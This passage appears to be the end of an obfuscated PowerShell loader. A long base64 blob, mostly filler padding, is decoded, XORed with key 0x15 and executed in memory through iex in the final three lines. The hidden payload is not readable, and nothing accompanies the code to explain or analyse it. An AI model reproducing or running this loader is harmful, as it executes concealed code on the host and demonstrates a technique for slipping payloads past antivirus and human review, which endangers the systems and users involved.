VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFxUUFRUVFRWVFRUXFRMVFRUVEBUVFRyVFRUVFRUVFRUVFRUVFRU
VFRUVFREVFdUVFRUWlRUVHJUVFRUVFRUVFRUVFRUVFRUVFRUVERUVFRUVFRyVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRURFRXVFRUVHRUVFRyVFRUVFRUVFRUVFRUVFRUVFRUVFREVFRUVFRUIlRYVFRf
V1RUVFd2VGJUVFRUVFRUVFRUVFRXdlRvRFRUVFdCVFNYVE1iV0JUUEBUQHJXQVRQflRBYldaVFMt
VEZEV1pUUExUQWJUVFRUVFRjREFjOnJUVFREVFRUVFBUVFRUVFRUVFRURFRUVFRUVEViVFRUVFRU
VFRUUFRUVFRURFRUVFRUVFRUVFRUVFRUVFRUVFRQRFRUVFRXVFNMVExEV2xUUExUdERXZlRSQFRG
RFdgVFJMVHdiVFRUVFRUX1RUUFRUVFRDVFdsVFJQVHdyV29UUmJUTERXJVRSflR3YldgVFRUVFRU
VFRUWVRQY1RcVFRUUFRAYlclVF1cVHREV2BUUnZUR3JXZVRSYlRPRFdfVFIhVE9yV2NUVFRUeFRc
VFRUUFRYVFRiVFFUVFhUVGJUUURUTHJUYlRUVFRSclRXVFRQVERiV2NUUiVUd0RXeVRSIVRxVFdv
VFRUVFRUVFRUVlxUVERUV1RQWFR3YldhVF1UVExEV2BUXX5UQXJXfVRSJVRPRFRUVFRUVFRUVFRU
UHpUUERUV1RQTFR0RFdmVFJAVEdUV3lUXVhUTGJXbFRSflR2VFclVFJ+VHdiV2BUVFRUVFRXQVRS
clRMRFdsVF1UVEFUV2NUUnZUdERXYFRTVFR2cldjVFIlVHZUVyVUVFRUVFRUYlRUclRURFdSVFJ+
VHdUV3lUU0xUT0RXbFRdWFR0RFdjVFIhVFRUVFRUUVBUWXJUYlRWIVRYVFRgVFFUVFRUV15UV0BU
VERXX1RSIVRxVFd5VF1cVHdyV31UUmJUQXJXfVRSJVRPRFRUVFNYVHRUV31UXVxUdlRXWFRSLVRP
YldlVFIhVEBUV2xUUi1Ud0RXYlRdRFRZcld5VF1yVE9EVFRUVFRURlRURlRUUFRBVFd5VFJ2VExE
V2ZUUFhUd2JXYlRdflR2cldlVFJ2VHRUVyVUVFRURGJXY1RdVFRwRFdsVFJ+VE9iV3pUXURUXFRW
ZVRWVFRcVFRsVFFUVFhEVCBUVFRUXnJUV1RUUFRBVFd5VFJ2VExEV2ZUU0RUdnJXfVRSRFRPRFdh
VFJQVHZyV2dUXVhUVFRUVFRUVFRUVFdGVFdAVFREV0VUXVxUdERXe1RSflR3cld9VFJiVEdyV2VU
UmJUT0RXYFRSUFR3RFd5VFRUVEBiV3pUUlBUdnJXYlRQYlR3Yld7VFJ+VHdyV0RUXVxUd2JXYVRd
VFRxVFRgVFJAVHBUV3lUVFRUVFRXVlRXUFRURFdEVF1cVHdiV35UXUBUTGJXJVRQIVRMRFdhVFJA
VFRUVFRUU1hUdFRXfVRdXFR2VFdYVFItVE9iV2VUUiFUQFRXbFRSLVR3RFdiVF1EVFRUVFRUUURU
VlRUV1RTVFR2cldjVFJEVHFEV39UXURUQ3JXeVRdXFR2YldlVFItVHdyVFRUUVBUWXJUYlRWIVRY
VFRgVFFUVFRUVCFUVHJUVERXV1RdWFR2Yld5VFIlVExyV2ZUXX5UXFRXQlRSQFR2cldvVFJ+VHdi
V2BUVFRUWERUYFRRVFRZclRiVFYhVFhUVFRURW1RVFRRZFREVFRUVFRUVFRUVFRUUWNgIi0tRSZ9
YXdWVydPTV9vdEIsYEVGXG1Zf1R8XFJDYEwnLH50QiB7RUZfQ0NQTGFaVlxydiZHfXd4R313Uixg
T0ElfHBCQ29cfy0+UUR6W1Z/bX12Jlt5d0JfZnBGVyF3Qm1gdm8lfHFNX2Bae1t/dFJDYUxNWGF3
Qnl/dngsb3cnTyVZQltjd0FlfXYnJWBxf1B8XFIkfXd4eXhPTVslQ3hDbHYneWN3fyV8WEYhYlx/
IVtWfFRyRVJTb3YnQ2FMeG0gRkJHeXd7R2VxXX5ycXhDbHYneWN3fyV8WEYhYll/VGBYVlxyd3hT
YU9BJXxBTXlXdl1XZnRCW31xUnljd3wgfXZdVHxZbyFbVnxUckVdR2xxTVslRkIgeHdsVyF3Qm1g
dm8lfHFNX2Bae1t/dFJDYUxNWGF3Qnl/dngsb3cnTyVZQltjd0FlfXYnJWBxf1x8RXIlXlxWVHJc
UW1vT0JbJHZ4eSVwQSFbVnxUclxWVHJcUW1sT01TJE9NWyVPQkdEdnh5J3RCbXlPJ0NvXF19YXdS
IG9FRl8kdnghI3YnW3pPQiR9dmwkYXRCW2x3JltjT3tEYUwnLGFaeFNvd0YgJ1hsXD5RRHpyXFZU
clxWVHJcUW1sT01TJE9NWyVPQkdTcFJDf3FNR2V3JyBYT01PeXdWV2ZPTU95d1ElfExNW193e09j
dCdDbFx8VyR0QFN/TCdDb3ZvJXxPeFNmdidAfFlvIVtWfFRyXFZUclxRYmN2eENtcUJDb3FSQ35A
XV9lcXh5Zk9CcXl2byFbVnxUclxWVC1ZJlt5TCZDbHRNRyBFciVeXFZULVkmR2xxTVslRkIgeHdv
IVtWf2JjTE1bb09CJHx3XX4+VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUWFRU
VFFUVFRUV0QtVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVCgoNx81
NTU1MUdURjUoNU5GbGZhcHg7R3BzeXB2YXx6eztUZmZweHd5bEgvL1l6dHE9TlZ6e2NwZ2FILy9T
Z3p4V3RmcCMhRmFnfHtyPTF3dGZwIyF3fHt0Z2w8PB8fNTU1NTFaeXFWentmenlwWmBhNSg1TlZ6
e2Z6eXBILy9aYGEfNTU1NTFGYWd8e3JCZ3xhcGc1KDVbcGI4Wnd/cHZhNVxaO0ZhZ3x7ckJnfGFw
Zx81NTU1TlZ6e2Z6eXBILy9GcGFaYGE9MUZhZ3x7ckJnfGFwZzwfHzU1NTVORn10Z2VZenJ8e0Vn
enhlYTtFZ3pyZ3R4SC8veHR8ez0xVnp4eHR7cTtGZXl8YT03NTc8PB8fNTU1NU5WentmenlwSC8v
RnBhWmBhPTFaeXFWentmenlwWmBhPB81NTU1MUdwZmB5YWY1KDUxRmFnfHtyQmd8YXBnO0F6RmFn
fHtyPTwfNTU1NTFHcGZgeWFmHzU1H2gf"

$file = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($EncodedText))
$data = $enc.GetBytes($file)|%{$_-bXor0x15}
iex ([System.Text.Encoding]::ASCII.GetString($data))

